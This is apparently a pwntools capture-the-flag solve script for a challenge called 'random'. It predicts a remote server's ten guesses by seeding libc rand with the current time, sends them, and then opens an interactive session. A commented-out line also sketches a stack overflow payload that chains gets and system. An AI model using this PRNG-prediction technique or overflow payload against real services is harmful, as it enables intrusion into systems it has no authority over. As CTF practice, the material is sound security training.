from pwn import *
from ctypes import *
import time
context.log_level = 'debug'
context.arch = "amd64"
e = context.binary = ELF("random",checksec=False)
# r = e.process()
r = remote("challs.tfcctf.com", 30030)
sleep(2)
# payload = b"a"*72 + p64(elf.plt.gets) + p64(elf.plt.system)

context.log_level = 'debug'
context.arch = "amd64"
proc = CDLL("/usr/lib/x86_64-linux-gnu/libc.so.6")
timefunc = proc.time
srand = proc.srand
rand = proc.rand
srand(timefunc(0))
def rand_value():
    randnum = rand()
    log.info("%d " % randnum)
    return randnum

payload = [0,1,2,3,4,5,6,7,8,9]

for i in range(10):
    payload[i] =rand_value()

r.recvuntil(b"Guess my numbers!\n")
for i in range(10):
    # sleep(1)
    sleep(0.5)
    r.sendline(str(payload[i]))

r.interactive()